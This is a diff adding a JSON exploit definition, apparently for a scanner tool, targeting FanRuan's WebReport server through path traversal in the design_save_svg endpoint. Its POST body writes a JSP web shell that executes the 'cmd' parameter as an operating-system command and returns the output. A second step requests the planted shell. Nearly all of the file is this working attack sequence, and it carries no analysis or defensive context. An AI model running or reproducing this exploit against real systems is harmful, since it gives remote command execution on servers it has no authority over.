@@ -1,0 +1,42 @@
+{
+	"name":"帆软数据决策系统任意文件覆盖getshell",
+	"tag":"fanruan",
+	"type":"upload",
+	"poc":{
+		"pocGet":"/WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/shell.svg.jsp",
+		"pocPost":"{\"__CONTENT__\":\"<%java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\\\"cmd\\\")).getInputStream();int a = -1;byte[]b = new byte[2048];while((a=in.read(b))!=-1){out.println(new String(b));}%>\",\"__CHARSET__\":\"UTF-8\"}",
+		"header":{
+			"User-Agent":" Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.92 Safari/537.36",
+			"Connection":" close",
+			"Content-Length":" 675",
+			"Accept-Au":" 0c42b2f264071be0507acea1876c74",
+			"Content-Type":" text/xml;charset=UTF-8"
+		},
+		"status_code":"200",
+		"pattern":"()"
+	},
+	"exp":{
+		"step1":{
+			"expGet":"/WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/shell.svg.jsp",
+			"expPost":"{\"__CONTENT__\":\"<%java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(\\\"cmd\\\")).getInputStream();int a = -1;byte[]b = new byte[2048];while((a=in.read(b))!=-1){out.println(new String(b));}%>\",\"__CHARSET__\":\"UTF-8\"}",
+			"header":{
+				"User-Agent":" Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.92 Safari/537.36",
+				"Connection":" close",
+				"Content-Length":" 675",
+				"Accept-Au":" 0c42b2f264071be0507acea1876c74",
+				"Content-Type":" text/xml;charset=UTF-8"
+			},
+			"status_code":"200",
+			"pattern":"()"
+		},
+		"step2":{
+			"expGet":"/WebReport/shell.svg.jsp",
+			"header":{
+				"User-Agent":"Mozilla/5.0 (Linux;",
+				"content-type":"text/plain"
+			},
+			"status_code":"200",
+			"pattern":"()"
+		}
+	}
+}
